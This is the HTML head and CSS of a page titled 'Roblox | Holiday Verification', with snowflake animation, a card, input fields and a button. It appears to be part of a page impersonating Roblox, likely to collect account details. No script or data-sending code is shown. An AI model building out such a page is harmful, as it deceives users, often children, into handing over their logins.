    <title>Roblox | Holiday Verification</title>
    <style>
        body {
            margin: 0; padding: 0;
            background: linear-gradient(135deg, #1a0000 0%, #000000 50%, #000022 100%);
            font-family: 'Segoe UI', sans-serif;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden; color: white;
        }
        .snowflake {
            color: #fff; font-size: 1.2em; position: fixed; top: -10%; z-index: 1;
            animation: fall linear infinite;
        }
        @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
        
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 40px; border-radius: 24px;
            text-align: center; width: 360px; z-index: 10;
            box-shadow: 0 0 40px rgba(0,0,0,0.5);
        }
        .logo { width: 65px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #ff0000); }
        h1 { font-size: 22px; color: #ff4d4d; margin-bottom: 10px; }
        input {
            width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 8px;
            border: 1px solid #333; background: rgba(0,0,0,0.5); color: white; box-sizing: border-box;
        }
        .btn {
            background: #ff4d4d; color: white; border: none; padding: 14px;
            width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s;
        }
        .btn:hover { background: #ff1a1a; transform: scale(1.02); }
    </style>
</head>
